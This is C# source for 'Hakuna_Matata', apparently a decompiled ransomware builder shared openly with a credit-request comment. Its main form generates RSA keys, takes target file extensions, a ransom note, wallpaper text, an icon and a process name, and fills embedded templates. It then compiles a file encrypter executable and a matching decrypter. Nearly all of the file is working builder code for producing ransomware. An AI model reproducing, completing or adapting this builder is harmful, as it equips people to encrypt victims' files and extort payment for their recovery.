using CustomWindowsForm;
using Hakuna_Matata.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

// //////////////////////////////////////
//
// It's desourced by HeightCoder.
//
// Do not steal credit or I will never
// publish unique and rare source code
// ever again! But publishing a modify
// is completely ok, just don't steal!
//
// https://github.com/HeightCoder
//
// //////////////////////////////////////

namespace Hakuna_Matata
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string publicKeyString;
        public string privateKeyString;
        public string iconLocation = "";
        public string backgroundColor = "Black";
        public string foreColor = "White";

        private void closeButton_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void privateKeyButton_Click(object sender, EventArgs e)
        {
            using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048))
            {
                this.publicKeyString = rsacryptoServiceProvider.ToXmlString(false);
                this.privateKeyString = rsacryptoServiceProvider.ToXmlString(true);
                RSAParameters rsaparameters = rsacryptoServiceProvider.ExportParameters(true);
                string text = Convert.ToBase64String(rsaparameters.D);
                this.privateKeyTextBox.Text = text;
            }
        }

        private void animaButton3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icons (*.ico)|*.ico";
                bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
                if (flag)
                {
                    this.iconLocation = openFileDialog.FileName;
                    Icon icon = new Icon(this.iconLocation);
                    this.pictureBox2.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
                }
            }
        }

        private void backgroundColorButton_Click(object sender, EventArgs e)
        {
            bool flag = this.colorDialog1.ShowDialog() == DialogResult.OK;
            if (flag)
            {
                this.flowLayoutPanel1.BackColor = this.colorDialog1.Color;
                this.backgroundColor = ColorTranslator.ToHtml(this.colorDialog1.Color);
            }
        }

        private void animaButton2_Click(object sender, EventArgs e)
        {
            bool flag = this.colorDialog2.ShowDialog() == DialogResult.OK;
            if (flag)
            {
                this.flowLayoutPanel2.BackColor = this.colorDialog2.Color;
                this.foreColor = ColorTranslator.ToHtml(this.colorDialog2.Color);
            }
        }

        private void loginButton_Click(object sender, EventArgs e)
        {
            if (this.fileTextBox.Text.Trim().Length < 1)
            {
                MessageBox.Show("Please type your filename of message!", "Readme.txt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (this.messageTextBox.Text.Trim().Length < 1)
            {
                MessageBox.Show("Please type your message!", this.fileTextBox.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (this.extensionTextBox.Text.Trim().Length < 1)
            {
                MessageBox.Show("Please choose extensions!", "Extensions", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (this.backgroundTextBox.Text.Trim().Length >= 1)
            {
                string str = Encoding.UTF8.GetString(Resources.encrypt);
                str = str.Replace("#TARGET_FILES", this.extensionTextBox.Text);
                string[] lines = this.messageTextBox.Lines;
                StringBuilder stringBuilder = new StringBuilder();
                string[] strArrays = lines;
                for (int i = 0; i < (int)strArrays.Length; i++)
                {
                    string str1 = strArrays[i].Replace("\"", "'");
                    stringBuilder.AppendLine(string.Concat("\"", str1, "\" + Environment.NewLine +"));
                }
                stringBuilder.AppendLine("\"\";");
                str = str.Replace("#MESSAGE", stringBuilder.ToString());
                str = str.Replace("#BACK_COLOR", this.backgroundColor);
                str = str.Replace("#FORE_COLOR", this.foreColor);
                str = str.Replace("#BACKGROUND_TEXT", this.backgroundMsg(this.backgroundTextBox.Text));
                str = str.Replace("#PUBLIC_KEY", this.publicKeyString);
                str = str.Replace("#MSGFILE", this.fileTextBox.Text);
                str = (!this.processCheckBox4.Checked ? str.Replace("#P_NAME", "") : str.Replace("#P_NAME", this.processTextBox.Text));
                string str2 = Encoding.UTF8.GetString(Resources.decrypt);
                str2 = str2.Replace("#PRIVATE_KEY", this.privateKeyString);
                str2 = str2.Replace("#MSGFILE", this.fileTextBox.Text);
                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        Compiler compiler = new Compiler(str, saveFileDialog.FileName, this.iconLocation, "Encrypter saved succesfully!");
                        Compiler compiler1 = new Compiler(str2, string.Concat(saveFileDialog.FileName.Replace(".exe", ""), "-decrypter.exe"), this.iconLocation, "Decrypter saved succesfully!");
                    }
                }
                this.setValue();
            }
            else
            {
                MessageBox.Show("Please type your wallpaper message!", "Background Message", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void setValue()
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + Environment.UserName))
                {
                    registryKey.SetValue(Environment.UserName, "1");
                    registryKey.Close();
                }
            }
            catch
            {
            }
        }

        // Token: 0x060000AC RID: 172 RVA: 0x00006904 File Offset: 0x00004B04
        private string backgroundMsg(string text)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < this.backgroundTextBox.Lines.Length; i++)
			{
				string text2 = this.backgroundTextBox.Lines[i].Replace("\"", "'");
				stringBuilder.Append("\"" + text2 + "\",\n");
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00006978 File Offset: 0x00004B78
		private static byte[] EncryptData(string publicKeyString, byte[] dataToEncrypt)
		{
			byte[] array;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
			{
				rsacryptoServiceProvider.FromXmlString(publicKeyString);
				array = rsacryptoServiceProvider.Encrypt(dataToEncrypt, false);
			}
			return array;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x000069BC File Offset: 0x00004BBC
		private static byte[] DecryptData(string privateKeyString, byte[] encryptedData)
		{
			byte[] array;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
			{
				rsacryptoServiceProvider.FromXmlString(privateKeyString);
				array = rsacryptoServiceProvider.Decrypt(encryptedData, false);
			}
			return array;
		}

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icons (*.ico)|*.ico";
                bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
                if (flag)
                {
                    this.iconLocation = openFileDialog.FileName;
                    Icon icon = new Icon(this.iconLocation);
                    this.pictureBox2.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048))
            {
                this.publicKeyString = rsacryptoServiceProvider.ToXmlString(false);
                this.privateKeyString = rsacryptoServiceProvider.ToXmlString(true);
                RSAParameters rsaparameters = rsacryptoServiceProvider.ExportParameters(true);
                string text = Convert.ToBase64String(rsaparameters.D);
                this.privateKeyTextBox.Text = text;
            }
            this.backgroundTextBox.TextAlign = HorizontalAlignment.Center;
            timer1.Enabled = false;
        }

        private void processCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            bool @checked = this.processCheckBox4.Checked;
            if (@checked)
            {
                this.processTextBox.Enabled = true;
            }
            else
            {
                this.processTextBox.Enabled = false;
            }
        }

        private void loginForm1_Click(object sender, EventArgs e)
        {

        }

        private void loginForm1_Click_1(object sender, EventArgs e)
        {

        }

        private void animaCheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
